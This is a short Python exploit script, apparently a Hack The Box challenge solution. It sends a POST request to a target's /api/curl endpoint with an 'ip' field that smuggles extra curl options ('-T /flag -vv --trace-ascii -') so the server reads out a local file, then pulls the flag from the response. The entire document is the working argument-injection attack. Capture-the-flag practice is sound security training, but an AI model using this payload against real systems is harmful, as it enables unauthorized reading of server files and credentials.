import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage: python3 CurlExploit.py ip:port")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/api/curl"

data = {
    "ip": "127.0.0.1 -T /flag -vv --trace-ascii -"
}

try:
    r = requests.post(url, data=data, timeout=5)
    r.raise_for_status()
except requests.exceptions.RequestException as e:
    print(f"Failed to send request: {e}")
    sys.exit(1)

flag = re.search(r"HTB\{.*?\}", r.text)
if flag:
    print(flag.group(0))
else:
    print("Flag not found")
